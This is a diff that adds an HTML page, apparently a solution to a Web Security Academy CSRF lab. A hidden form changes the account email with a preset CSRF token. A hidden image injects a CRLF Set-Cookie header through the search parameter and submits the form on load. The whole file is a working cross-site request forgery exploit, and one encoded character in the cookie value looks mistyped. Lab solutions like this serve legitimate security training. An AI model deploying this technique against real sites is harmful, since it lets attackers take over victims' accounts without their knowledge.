@@ -1,0 +1,12 @@
+<html>
+    <body>
+        <h1>HEY THERE!</h1>
+        <form action = "https://0a0500e3039c38f8809962bf00bd00e9.web-security-academy.net/my-account/change-email" method = "POST" id="csrf-form">
+            <input type="hidden" name="email" value="solved_finally@solved.finally">
+            <input type="hidden" name="csrf" value="b8b0uO90wgkBLX7B5tmS1ef3QQHnIXCT">
+        </form>
+
+        <!-- for header injection : -->
+        <img style = "display: none;" src ="https://0a0500e3039c38f8809962bf00bd00e9.web-security-academy.net/?search=sticks%0d%0aSet-Cookie:%20csrfKey%3V9j8DUXg3Ynr3HkU4tEgBE523Wk0Qfh7" onerror="document.forms[0].submit()">
+    </body>
+</html>
